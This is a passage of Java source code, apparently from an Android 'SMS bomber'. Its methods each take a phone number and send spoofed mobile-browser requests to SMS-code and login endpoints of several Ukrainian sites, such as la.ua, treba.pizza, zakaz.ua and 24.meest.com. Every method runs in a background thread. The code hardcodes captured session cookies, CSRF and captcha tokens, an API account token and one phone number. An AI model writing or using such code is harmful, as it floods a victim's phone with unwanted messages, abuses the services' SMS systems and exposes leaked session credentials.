                .header("cookie", "cid=338759648534478788915798746209268022059; evoauth=we59bdeff11a7408a9d365db7028a3bb8; auth=4697c29072334bb32c98bce908dec9f902fe8e86; _ga=GA1.1.1162147731.1696071879; __gads=ID=b0a2c236d22f7869-22d02c8fccde0053:T=1696071880:RT=1696071880:S=ALNI_MYDAySaUS7pXA1mMMWxTb0tki3uFQ; __gpi=UID=00000c89e1bf1894:T=1696071880:RT=1696071880:S=ALNI_MZ7epiRvYCDGIWCITp3aIP15TbOfg; _ga_N053KL2046=GS1.1.1696071878.1.1.1696071893.45.0.0; user_tracker=6863084192b66fb6b47980cca14aa00760739dd6|193.30.245.6|2023-09-30; csrf_token=f5bd6d77749a4fdeabda9c280d06a6c9")
                .header("origin", "https://bigl.ua")
                .header("pragma", "no-cache")
                .header("referer", "https://bigl.ua/")
                .header("sec-ch-ua", "\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-site")
                .header("user-agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36")
                .header("x-csrftoken", "f5bd6d77749a4fdeabda9c280d06a6c9")
                .header("x-language", "uk")
                .header("x-requested-with", "XMLHttpRequest")
                .build();
        new Thread(new Runnable() {
            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();

    }
    public void bm(String num) {

        OkHttpClient client = new OkHttpClient();

        RequestBody formBody = new FormBody.Builder()
                .add("phone", num)
                .add("_token", "NBYUAvalIg6Cc9MwpO50tdMw9I2K0a82qHodztrE")
                .build();

        Request request = new Request.Builder()
                .url("https://vmtehnika.com.ua/auth/login/sms")
                .post(formBody)
                .header("authority", "vmtehnika.com.ua")
                .header("accept", "*/*")
                .header("accept-language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("cache-control", "no-cache")
                .header("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
                .header("cookie", "cart=b0%3Bi%3Bj0%3Bk%3Bl%3Bd%3Bt%3Bc; compare=%5B%5D; _gcl_au=1.1.998350402.1696072367; _ga=GA1.1.452871950.1696072368; _fbp=fb.2.1696072367773.1223853455; rngst=%7B%22clientId%22%3A%22236389af-2ba0-400b-9cac-fd7ee372aa7d%22%7D; rngst_callback=%7B%22callbackNumber%22%3Atrue%2C%22avg_time_to_call%22%3A80%2C%22is_working_time%22%3Atrue%2C%22is_callback_by_click%22%3Atrue%2C%22is_callback_by_duration%22%3Atrue%2C%22inactive_project%22%3Afalse%2C%22ip_is_blocked%22%3Afalse%2C%22recaptcha%22%3A0%2C%22timer%22%3A30%2C%22default_language%22%3A%22uk%22%2C%22ordered_calls%22%3A%5B%5D%2C%22forms%22%3A%5B%7B%22form_type%22%3A%22default%22%2C%22language%22%3A%22ru%22%2C%22delayed_callback_enabled%22%3Atrue%7D%2C%7B%22form_type%22%3A%22default%22%2C%22language%22%3A%22uk%22%2C%22delayed_callback_enabled%22%3Atrue%7D%2C%7B%22form_type%22%3A%22forced%22%2C%22language%22%3A%22ru%22%2C%22delayed_callback_enabled%22%3Atrue%7D%2C%7B%22form_type%22%3A%22forced%22%2C%22language%22%3A%22uk%22%2C%22delayed_callback_enabled%22%3Atrue%7D%5D%7D; location_city_id=4958; views=eyJpdiI6IkwwTFpQVG5WajRiWk1BU29zV3NLTVE9PSIsInZhbHVlIjoiZ29KK3dkT204SVVmY1ZySlBLQXVFdml3VElwcU1ualVHMTd5VkZ0K3R6NG11NUNQMkFJYnQyMnpRSk9DbVIrMCIsIm1hYyI6IjVkZjYyNDg1MzkyMTVkOWZmZjkyN2ZjMzE3NWFjNmQwZjE1NGNmYjg4Mjc1N2M5Y2VjYTI5YjRiMzc4ZjFmZTAiLCJ0YWciOiIifQ%3D%3D; XSRF-TOKEN=eyJpdiI6IkQvVXpCOTE1NjlMaFZTMlRpdEZsZlE9PSIsInZhbHVlIjoiQUd3d3RNZnpBeitGdks1NlNub2h6MmFrYzdQdTJGeVBHdFlkVTR1TjJYR3o2eHdlUHgrY1VvQUF5VXQ2TmVQRW5OK0JYaGQvL0VLZ2hNdGJVL1JBS1hVaE5pbi9xRXpJRzR6NlhJS2hzYkVQMU5CeW9jYndLRVNhNUZOSzZUVjYiLCJtYWMiOiIyZWIwYWNlYzA2ZDVjMmFmNzNlY2NkZDMzY2FkOTg3YzQ4MWE0YzZiNGM1NDIzZGIwNmNmNDg5NGNmNTM2ZGQ5IiwidGFnIjoiIn0%3D; vmtehnika_session=eyJpdiI6IndtUUozZ0VYdmFXRUsrWmM4UFBiZlE9PSIsInZhbHVlIjoicnF2VUZnTEMxei9qUFBlT2JiMjhRWTR5aEg1dTM2Ym56SVdwOW5TR1l3ZDV0N0lqc3JTeEZxTlRlZnZxMDNONTB4dHJLWmNnaUNKbytFREtlQThsUGJQeFZJUzV3L2pPYkxwWWtrdlp6QmNmSmlEaE9KRDFBVTFhcTFUdFBFMWQiLCJtYWMiOiIxZTA1MDNmYmIzOGUzODE0OTA0MTdhMDM2ZmQ4YTAyM2VmYzgzNzliNDczYWU1ZTE1MzhiYWY1OGU0MjE0MWYxIiwidGFnIjoiIn0%3D; city_data=eyJpdiI6IkxpcjBVa1EzOGp2TFdaTVczbkxvR1E9PSIsInZhbHVlIjoiWTVPa3VtdWxDQStIMitIaGRCeGNwZDdOTGhUN1RCa1RWUGlqbW1RZWRuc2ZDbVJqRVR1T2F5SGJnaHRyLzlwMGlFOXJqRkVEU2pDek5GQW5uUTdKa0VFaC95R2l0dkUxaXgzdERLdVpQQWdHQmtpL09mNm96YkpyaVRUcFVVTTI2VW9wSHV2Yk8rWW0xQXJ6cGZFNW5TR0xXTFVDU0xsNllhWWNLdzlUZlZ1aTJVNmlTTm90c2VwRGw0ajl5bEhQYy9lUjE3dWZYWm9WajcycGc2bVN1cWJraEV1TmRROWpiZW90azFzODdrK2h1ZnVhOTA4NzFPN2VQV3M0YjVmNC9JcmdKUmE5N0ppSHpyc2JFMXh0eWF0ajZ1Z1U2REJwdlYrUm1HdFZNRjVyS1BlcUVCTlFyNWpLM1RHaFlKZGJqaVF5Z2hwVUV2YjlQdi8vNlpmL2JyUm5ka2R0UWVac0Z5VVBXalFCQWhOL1JMZGV1Y3p5R29MM3phcTNyQkx0M2lLckx6WUZNYVJIbngwSHdzb1lWQlN0MzVKNkZCOUpnOVMreksyOUVsVVRmMzdtV0t3YVcvY3kzalFGZTA4aFpNYWQweHVQYlduWGl0ZmJrU3kxM1ppb1dJY3Y2MFJQL0lieXI4bDZ5bGsyUkhienJneW5jenQ1TjZwRnFadFcxRDBZdTMzQ3pkcmxxemFSQ0s3OUJiVUNvT3hISGJDSXl6L2xUV2lvY3ZnN1Zqdmo5eFZDeTNORmRMMzVzcmFCbGk4K1FrZG5mTGZKRFJzaGREY25yYlVBeFFrZllxUjdCVThWK2Y1SGo3eDA0cmhKUDAwZlVna1pYcnJmOHRCbk5hQjBhZlpXWUFLMkRzcWo3ZUd5MWxHRUI0Tmt3bU9ENUVKREdQdDJpNlVvZWJYNkJ0a3B1Y2hsNGp6ZUNNYTVvSk80WklFMDJWdnpYYlk3L1Z6RGwwRXE1cEw4NW4raHhkZTZBNS8yVG9laThuYzZ1TGk4U1JQOHJyY1NML25jdnM1SDI1UUljVFg0VGdidFhoYkxCQ3U5Z1ZNSi81dTUvWnBzRHJ6NDJTVWVIaDltQmpPK2NoU3lFcnRPbGdOanVJL3JzMTIxSTdYQ1F2dExpcGZVS0k5cjZCWGZ0bmc0TGVSWWYreHdHZk1YamdVbU1UckYwSEdRK2p2NVZvUXVXNmp5Nys0aVQwYXhyZG9CT0hLOEw4WTdNdXdJUjN1b0xlVnUwMUZ6MklId2RXZlBYdEMwVFpScDlFNnJmaUpsNUlSOCt3SWx2VjM3cTBabXhNdkZxVUZvNjdLaTFWbUVMTGk0T1hWNkMrZWNzUTM5bExkN0ZWbkdZVnBvc3VMZjl2ZmNyRXI0WUxrcWNoWVQ5alg2OE5vaWUzdlAvRFFlUytuVll3NktSVGk3c0lOL3BmMUFCRElrYlRGM1VtbHNoNEVwSnBYVjRCRTQ5ZE5TallHcHgwQkl6RmR5WndIZEJqMVE2YlFqRDYyRTZZVlV6MEdQRzE0TSt3L2poS2ZpNEZZSHhuUTNSdGJEd3RvRmliQlBHbWtsZkt1M1NZb3RKSytaZnR1WGFma3hDVHpNTGRTcjFnL1ZvcThTTWtRc2lxVitLM2kzZTFiUGY3M29FRnNsVGprZU91MW9CK2M0NzlsUzZUSlF0VXhhVVY5YUl4MDV3dW1PQXJGZk9pQmFGMXhBVE1nN2RtVm90blR0S1JyL2QvdmYrdjR1TDhYL3EyK29pV2Z5U1g1ZllrY010RzBrUmR5cHUydDdMaGc1TWptNjNGZ3hHL1VnVEpOTlgramhtRW1LejhsZU9PNU9pQS9XTU5vMUNWRXFTamZRYmJocldZZTdoSEl2UTV1MzN5M1pNbUtYUzZ5MU8wTTJUNVFZckE9PSIsIm1hYyI6IjkyNWE4NGQ5YjU5MWRjZDcxNjkxNGQzNjA0NGVjMDllZDRlNmMxYTk4YTQ2NmRmMWNlNTk1YmQ5NzQ3OWM1OGEiLCJ0YWciOiIifQ%3D%3D; _ga_NS663NNQD1=GS1.1.1696072367.1.1.1696072394.33.0.0")
                .header("origin", "https://vmtehnika.com.ua")
                .header("pragma", "no-cache")
                .header("referer", "https://vmtehnika.com.ua/")
                .header("sec-ch-ua", "\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("user-agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36")
                .header("x-requested-with", "XMLHttpRequest")
                .build();
        new Thread(new Runnable() {
            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();

    }
    public void lapec(String num) {

        OkHttpClient client = new OkHttpClient();

        String requestBody = "action=user_login&formData=tel%3D%252B38(063)545-34-53%26code%3D&nonce=1a3ac9bb49";

        RequestBody formBody = new FormBody.Builder()
                .add("action", "user_login")
                .add("formData", "tel=+" + num + "&code=")
                .add("nonce","1a3ac9bb49")
                .build();

        Request request = new Request.Builder()
                .url("https://la.ua/wp-admin/admin-ajax.php?lang=uk")
                .post(formBody)
                .header("authority", "la.ua")
                .header("accept", "*/*")
                .header("accept-language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("cache-control", "no-cache")
                .header("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
                .header("cookie", "qtrans_front_language=uk; wp_woocommerce_session_e08d833514135b1f76557a5cc5a29de3=c4a5caf006349bc05d820cdf007f34c8%7C%7C1696243495%7C%7C1696239895%7C%7C4920ccf85ac5119b30656717923770ad; woocommerce_cart_hash=090b7990b32a75f674ba38f60b1d0b40; _gcl_au=1.1.990171116.1696070696; _clck=3421g8|2|ffg|0|1368; _ga=GA1.1.1420126091.1696070696; _fbp=fb.1.1696070696536.326628903; geolocation=%D0%9B%D1%8C%D0%B2%D1%96%D0%B2; _clsk=l92pbz|1696089784156|2|1|q.clarity.ms/collect; _ga_F5XB1SKG67=GS1.1.1696089738.2.1.1696089802.60.0.0")
                .header("origin", "https://la.ua")
                .header("pragma", "no-cache")
                .header("referer", "https://la.ua/")
                .header("sec-ch-ua", "\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("user-agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36")
                .header("x-requested-with", "XMLHttpRequest")
                .build();
         new Thread(new Runnable() {
            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();

    }
    public void ivanopizza(String num) {

        OkHttpClient client = new OkHttpClient();

        RequestBody formBody = new FormBody.Builder()
//                .add("phone", num)
//                .add("token", "982567")
                .build();

        Request request = new Request.Builder()
                .url("https://treba.pizza/api/phone-verify?phone=380637459379&token=982567")
                .post(formBody)
                .header("authority", "treba.pizza")
                .header("accept", "application/json, text/plain, */*")
                .header("accept-language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("api-account-token", "5c932410-00a4-11ea-9999-e9560d593733")
                .header("api-lang", "ua")
                .header("cache-control", "no-cache")
                .header("content-length", "0")
                .header("cookie", "_gcl_au=1.1.1069648144.1696090962; _ga=GA1.2.538021542.1696090963; _gid=GA1.2.371864793.1696090963; _gat_UA-90844279-4=1; _fbp=fb.1.1696090962771.385688610; _clck=1pc979m|2|ffg|0|1368; NEXT_LOCALE=ua; csrfSecret=VyMIN1Nw5HdrkFAMqjeXH7RG; XSRF-TOKEN=aQk42wQT-m-lK_ffW4kihQLfjNEZZEVzvWSg.sOAHVsxbcwx3Ldp7giagq%2F8fhMNHzllPn4XKCr%2FGSEM; _clsk=1o8zbjz|1696090970263|2|1|q.clarity.ms/collect; _ga_3ESV84WL43=GS1.1.1696090962.1.1.1696090985.37.0.0")
                .header("origin", "https://treba.pizza")
                .header("pragma", "no-cache")
                .header("referer", "https://treba.pizza/auth/login")
                .header("sec-ch-ua", "\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("user-agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36")
                .header("x-xsrf-token", "aQk42wQT-m-lK_ffW4kihQLfjNEZZEVzvWSg.sOAHVsxbcwx3Ldp7giagq/8fhMNHzllPn4XKCr/GSEM")
                .build();
         new Thread(new Runnable() {
            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();

    }
    public void chacha(String num) {

        OkHttpClient client = new OkHttpClient();

        String requestBody = "{\"phone\":\"" + num + "\",\"token\":\"9816a221c75a1631f9306750da9fd447e84f\"}";
        MediaType mediaType = MediaType.parse("application/json; charset=utf-8");
        RequestBody requestBody1 = RequestBody.create(mediaType, requestBody);

        Request request = new Request.Builder()
                .url("https://e-api.com.ua/api/v1/call2fa/mama-vdoma/call-pool/create")
                .post(requestBody1)
                .header("Accept", "application/json, text/plain, */*")
                .header("Accept-Language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("Cache-Control", "no-cache")
                .header("Connection", "keep-alive")
                .header("Content-Type", "application/json")
                .header("Origin", "https://chacha.kiev.ua")
                .header("Pragma", "no-cache")
                .header("Referer", "https://chacha.kiev.ua/")
                .header("Sec-Fetch-Dest", "empty")
                .header("Sec-Fetch-Mode", "cors")
                .header("Sec-Fetch-Site", "cross-site")
                .header("User-Agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36")
                .header("X-Custom-Header", "foobar")
                .header("sec-ch-ua", "\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .build();
         new Thread(new Runnable() {
            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
    public void cappi(String num) {
        OkHttpClient client = new OkHttpClient();

        Request request = new Request.Builder()
                .url("https://cappiadmin.com.ua/api/v2/get-smscode?phone="+num)
                .header("authority", "cappiadmin.com.ua")
                .header("accept", "application/json, text/plain, */*")
                .header("accept-language", "ru")
                .header("cache-control", "max-age=31536000, public")
                .header("client", "1")
                .header("origin", "https://cappi.ua")
                .header("pragma", "no-cache")
                .header("referer", "https://cappi.ua/")
                .header("sec-ch-ua", "\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "cross-site")
                .header("user-agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36")
                .build();
        new Thread(new Runnable() {
            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
    public void sezam(String num) {

        OkHttpClient client = new OkHttpClient();

        String requestBody = "{\"phone\":\"+" + num + "\",\"agree\":1}";
        MediaType mediaType = MediaType.parse("application/json; charset=utf-8");
        RequestBody requestBody1 = RequestBody.create(mediaType, requestBody);

        Request request = new Request.Builder()
                .url("https://api.sezamfood.com.ua/ru/request/auth-phone")
                .post(requestBody1)
                .header("authority", "api.sezamfood.com.ua")
                .header("accept", "application/json, text/plain, */*")
                .header("accept-language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("cache-control", "no-cache")
                .header("content-type", "application/json;charset=UTF-8")
                .header("origin", "https://sezamfood.com.ua")
                .header("pragma", "no-cache")
                .header("referer", "https://sezamfood.com.ua/")
                .header("sec-ch-ua", "\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-site")
                .header("user-agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36")
                .header("x-line-header", "sezamfood.com.ua")
                .build();
        new Thread(new Runnable() {
            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
    public void dosatvka(String num) {

        OkHttpClient client = new OkHttpClient();

        String requestBody = "{\"captcha_token\":\"03AFcWeA45JvEnsVR_hGM8ksegPCqc_YKZhI76dtb2mmRYcFhE554s3ktsRCFQdS9Cq-LmxtwdghTi6GQPOWmA1FEANPVZHnP4nSpv2CgLsM-yf6h43vHyOMK62RbequhIL6KT85TaGvuSEBuwOXkTuMNd-QwRVBHG56S7hjGfKPQETsOKbMDPmUfgycE4pBPhCb2PBIrpSmfV5Kw-TtNK_93akS2Ilr8mKOpNVGmWoK0TN1MQgGiD_JvV2_bLd-ykwFDA7OGCfjawkxOxQlwS1uIFE_WXwX6A2PLL9gkGP-iVtGBh9vg6nIG8okrHtfZSrctkxSYbnEmkeSyjufhYgvf44ZUXMwIbCp8J3q_C_WyqQGRlMm3wnKknD6S3K4AYEdPwFPinahQGog7gdnvVqJmzIk0n36s_nUTi5ET_sqw9_wUhS1PtdgQsrNF0m8cDW4mCRWjE3AanI6zoi4InbJV7QePdDLcCKgUyJbqbiuSEQ4qH5vfC5IHSCRmmbN0wQjW4vRvXS87m\",\"accepted_privacy_policy\":true,\"phone\":\"" + num + "\"}";
        MediaType mediaType = MediaType.parse("application/json; charset=utf-8");
        RequestBody requestBody1 = RequestBody.create(mediaType, requestBody);
        Request request = new Request.Builder()
                .url("https://stores-api.zakaz.ua/user/signup/")
                .post(requestBody1)
                .header("authority", "stores-api.zakaz.ua")
                .header("accept", "*/*")
                .header("accept-language", "uk")
                .header("cache-control", "no-cache")
                .header("content-type", "application/json")
                .header("cookie", "_hjSessionUser_1332871=eyJpZCI6IjIxM2MyM2I3LTIxNGQtNWRiZC1hNmNhLWYwYjFhZGNlNDRiMyIsImNyZWF0ZWQiOjE2ODY4MTAzMDkyOTYsImV4aXN0aW5nIjp0cnVlfQ==; _gcl_au=1.1.582000012.1696093697; _gid=GA1.2.485724405.1696093698; _gac_UA-122495531-1=1.1696093698.Cj0KCQjwjt-oBhDKARIsABVRB0xcgMg9AsRx8dTJzynW9xQGMMcgyEVi71e_7kFU0ZHFAC50_6chbPQaAjk0EALw_wcB; _gat_UA-122495531-1=1; _gac_UA-127940954-1=1.1696093698.Cj0KCQjwjt-oBhDKARIsABVRB0xcgMg9AsRx8dTJzynW9xQGMMcgyEVi71e_7kFU0ZHFAC50_6chbPQaAjk0EALw_wcB; _gat_UA-127940954-1=1; session_id_crossdomain=undefined; _ga_JNLVF192Z4=GS1.1.1696093698.1.0.1696093698.60.0.0; _ga=GA1.1.35118001.1696093698; _ga_8PZVEP8NLX=GS1.2.1696093698.1.0.1696093698.60.0.0; _ga_CPK07BFZ9F=GS1.1.1696093698.1.0.1696093698.60.0.0; _ga_4FV6P9Z1ZH=GS1.2.1696093699.1.0.1696093699.60.0.0; _fbp=fb.1.1696093699413.781688465; _tt_enable_cookie=1; _ttp=drOeuzEyZuQkmpgc49aZX8wgQWZ; __zlcmid=1I6mA4DfpSjK3vx")
                .header("origin", "https://zakaz.ua")
                .header("pragma", "no-cache")
                .header("referer", "https://zakaz.ua/")
                .header("sec-ch-ua", "\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-site")
                .header("user-agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36")
                .header("x-chain", "*")
                .header("x-version", "51")
                .build();
        new Thread(new Runnable() {
            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();

    }
    public void meets(String num) {

        OkHttpClient client = new OkHttpClient();

        RequestBody formBody = new FormBody.Builder()
                .add("login", num)
                .add("rozetkaCustomer", "0")
                .build();

        Request request = new Request.Builder()
                .url("https://24.meest.com/api/v1/login?lang=uk")
                .post(formBody)
                .header("Accept", "application/json, text/plain, */*")
                .header("Accept-Language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("Authorization", "Bearer null")
                .header("Cache-Control", "no-cache")
                .header("Connection", "keep-alive")
                .header("Content-Type", "application/x-www-form-urlencoded")
                .header("Origin", "https://24.meest.com")
                .header("Pragma", "no-cache")
                .header("Referer", "https://24.meest.com/uk/")
                .header("Sec-Fetch-Dest", "empty")
                .header("Sec-Fetch-Mode", "cors")
                .header("Sec-Fetch-Site", "same-origin")
                .header("User-Agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36")
                .header("sec-ch-ua", "\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"")
                .header("sec-ch-ua-mobile", "?1")
                .header("sec-ch-ua-platform", "\"Android\"")
                .build();
         new Thread(new Runnable() {
            @Override
            public void run() {
                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful())
                        throw new IOException("Unexpected code " + response);
                    response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
}
